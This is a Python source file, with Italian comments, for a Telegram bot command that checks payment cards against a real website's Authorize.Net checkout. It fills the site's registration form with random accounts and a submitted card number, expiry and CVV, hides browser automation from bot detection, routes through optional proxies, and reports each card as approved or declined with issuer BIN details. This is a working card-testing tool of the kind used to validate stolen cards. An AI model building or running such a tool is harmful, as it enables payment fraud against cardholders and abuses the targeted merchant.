import re
import logging
import random
import string
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client

logger = logging.getLogger(__name__)

def run_authnet_check(card_number, month, year, cvv, proxy_url=None):
    """
    Execute payment test on AuthNet Gate - VERSIONE SEMPLIFICATA
    """
    driver = None
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
        
        if proxy_url:
            chrome_options.add_argument(f'--proxy-server={self.proxy_url}')
        
        driver = webdriver.Chrome(options=chrome_options)
        wait = WebDriverWait(driver, 20)
        
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
        print("🔄 Accessing AuthNet registration...")
        driver.get("https://tempestprotraining.com/register/")
        time.sleep(5)
        
        # DEBUG: Vediamo cosa c'è nella pagina
        print("🔍 Page title:", driver.title)
        print("🔍 Current URL:", driver.current_url)
        
        # CERCHIAMO IL FORM PRINCIPALE
        forms = driver.find_elements(By.TAG_NAME, "form")
        print(f"🔍 Forms trovati: {len(forms)}")
        
        for i, form in enumerate(forms):
            print(f"  Form {i}: {form.get_attribute('id')} - {form.get_attribute('class')}")
        
        # PROVA A TROVARE I CAMPI CON APPROCCIO DIRETTO
        print("🔍 Cercando campi del form...")
        
        # 1. USERNAME
        try:
            username_field = driver.find_element(By.ID, "user_login")
            username = ''.join(random.choices(string.ascii_lowercase, k=8))
            username_field.send_keys(username)
            print("✅ Username compilato")
        except:
            try:
                username_field = driver.find_element(By.NAME, "user_login")
                username = ''.join(random.choices(string.ascii_lowercase, k=8))
                username_field.send_keys(username)
                print("✅ Username compilato (by name)")
            except:
                print("❌ Username non trovato")
        
        # 2. EMAIL
        try:
            email_field = driver.find_element(By.ID, "user_email")
            email = f"test{random.randint(1000,9999)}@gmail.com"
            email_field.send_keys(email)
            print("✅ Email compilata")
        except:
            try:
                email_field = driver.find_element(By.NAME, "user_email")
                email = f"test{random.randint(1000,9999)}@gmail.com"
                email_field.send_keys(email)
                print("✅ Email compilata (by name)")
            except:
                print("❌ Email non trovata")
        
        # 3. PASSWORD
        try:
            password_field = driver.find_element(By.ID, "user_pass")
            password_field.send_keys("TestPassword123!")
            print("✅ Password compilata")
        except:
            try:
                password_field = driver.find_element(By.NAME, "user_pass")
                password_field.send_keys("TestPassword123!")
                print("✅ Password compilata (by name)")
            except:
                print("❌ Password non trovata")
        
        # 4. CARD NUMBER
        try:
            card_field = driver.find_element(By.NAME, "authorize_net[card_number]")
            card_field.send_keys(card_number)
            print("✅ Card number compilato")
        except:
            print("❌ Card number non trovato")
        
        # 5. EXPIRY MONTH
        try:
            month_field = driver.find_element(By.NAME, "authorize_net[exp_month]")
            month_field.send_keys(month)
            print("✅ Expiry month compilato")
        except:
            print("❌ Expiry month non trovato")
        
        # 6. EXPIRY YEAR
        try:
            year_field = driver.find_element(By.NAME, "authorize_net[exp_year]")
            year_field.send_keys(year)
            print("✅ Expiry year compilato")
        except:
            print("❌ Expiry year non trovato")
        
        # 7. CVV
        try:
            cvv_field = driver.find_element(By.NAME, "authorize_net[cvc]")
            cvv_field.send_keys(cvv)
            print("✅ CVV compilato")
        except:
            print("❌ CVV non trovato")
        
        # 8. TERMS CHECKBOX
        try:
            terms_checkbox = driver.find_element(By.NAME, "terms")
            if not terms_checkbox.is_selected():
                driver.execute_script("arguments[0].click();", terms_checkbox)
                print("✅ Terms checkbox selezionato")
        except:
            print("❌ Terms checkbox non trovato")
        
        time.sleep(2)
        
        # 9. SUBMIT - PROVA TUTTI I METODI POSSIBILI
        print("🔍 Cercando bottone submit...")
        
        submitted = False
        
        # Metodo 1: Cerca per type submit
        try:
            submit_buttons = driver.find_elements(By.CSS_SELECTOR, "button[type='submit'], input[type='submit']")
            print(f"🔍 Submit buttons trovati: {len(submit_buttons)}")
            
            for btn in submit_buttons:
                if btn.is_displayed() and btn.is_enabled():
                    print(f"✅ Trovato submit button: {btn.get_attribute('outerHTML')[:100]}...")
                    driver.execute_script("arguments[0].scrollIntoView(true);", btn)
                    time.sleep(1)
                    driver.execute_script("arguments[0].click();", btn)
                    print("✅ Form inviato con JavaScript!")
                    submitted = True
                    break
        except Exception as e:
            print(f"❌ Errore submit method 1: {e}")
        
        # Metodo 2: Cerca per testo
        if not submitted:
            try:
                buttons = driver.find_elements(By.TAG_NAME, "button")
                for btn in buttons:
                    btn_text = btn.text.lower()
                    if any(word in btn_text for word in ['register', 'sign up', 'submit', 'complete']):
                        if btn.is_displayed() and btn.is_enabled():
                            print(f"✅ Trovato bottone per testo: {btn_text}")
                            driver.execute_script("arguments[0].click();", btn)
                            print("✅ Form inviato!")
                            submitted = True
                            break
            except Exception as e:
                print(f"❌ Errore submit method 2: {e}")
        
        # Metodo 3: Cerca per ID/Class
        if not submitted:
            try:
                submit_selectors = ["#submit", ".arm_form_submit_btn", ".btn-submit", ".register-btn"]
                for selector in submit_selectors:
                    try:
                        btn = driver.find_element(By.CSS_SELECTOR, selector)
                        if btn.is_displayed() and btn.is_enabled():
                            print(f"✅ Trovato submit: {selector}")
                            driver.execute_script("arguments[0].click();", btn)
                            print("✅ Form inviato!")
                            submitted = True
                            break
                    except:
                        continue
            except Exception as e:
                print(f"❌ Errore submit method 3: {e}")
        
        if not submitted:
            print("❌ IMPOSSIBILE TROVARE BOTTONE SUBMIT")
            return "ERROR", "Cannot find submit button"
        
        print("🔄 Processing payment...")
        time.sleep(15)  # Aspetta molto per il processing
        
        # ANALISI RISULTATO
        current_url = driver.current_url
        page_text = driver.page_source.lower()
        page_title = driver.title.lower()
        
        print(f"📄 Final URL: {current_url}")
        print(f"📄 Page title: {page_title}")
        
        # CONTROLLA SUCCESSO
        if 'my-account' in current_url or 'dashboard' in current_url:
            print("✅ SUCCESSO - Account creato")
            return "APPROVED", "Payment successful - Account created"
        
        if 'thank you' in page_text or 'welcome' in page_text or 'success' in page_text:
            print("✅ SUCCESSO - Messaggio di successo")
            return "APPROVED", "Payment successful"
        
        # CONTROLLA SE SIAMO SU UNA PAGINA DIVERSA
        if 'register' not in current_url and 'tempestprotraining.com' in current_url:
            print("✅ SUCCESSO - Pagina diversa da registrazione")
            return "APPROVED", "Payment processed successfully"
        
        # CONTROLLA ERRORI
        if 'declined' in page_text or 'error' in page_text or 'invalid' in page_text:
            print("❌ DECLINED - Errore nella pagina")
            return "DECLINED", "Payment failed - Error on page"
        
        # SE SIAMO ANCORA IN REGISTRATION
        if 'register' in current_url:
            print("❌ DECLINED - Ancora in registrazione")
            return "DECLINED", "Payment failed - Still on registration"
        
        # DEFAULT
        print("❌ DECLINED - Nessun indicatore chiaro")
        return "DECLINED", "Payment failed - Unknown result"
                
    except Exception as e:
        print(f"❌ Error during test: {e}")
        return "ERROR", str(e)
    finally:
        if driver:
            driver.quit()

async def authnet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with AuthNet Gate"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 'au')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /au number|month|year|cvv [proxy]")
        return
    
    full_input = ' '.join(context.args)
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
    else:
        card_input = full_input
    
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    wait_message = await update.message.reply_text("🔄 Checking AuthNet...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(f"❌ Invalid card: {parsed_card['error']}")
            return
        
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        status, message = run_authnet_check(
            parsed_card['number'],
            parsed_card['month'],
            parsed_card['year'],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        if status == "APPROVED":
            response = f"""Approved ✅

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: AuthNet $32
Response: {message}"""
        elif status == "DECLINED":
            response = f"""Declined ❌

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: AuthNet $32
Response: {message}"""
        else:
            response = f"""Error ⚠️

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: AuthNet $32
Response: {message}"""
        
        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

BIN Info:
Country: {bin_data.get('country', 'N/A')}
Issuer: {bin_data.get('issuer', 'N/A')}
Scheme: {bin_data.get('scheme', 'N/A')}
Type: {bin_data.get('type', 'N/A')}
Tier: {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response)
        
    except Exception as e:
        logger.error(f"❌ Error in authnet_command: {e}")
        await wait_message.edit_text(f"❌ Error: {str(e)}")
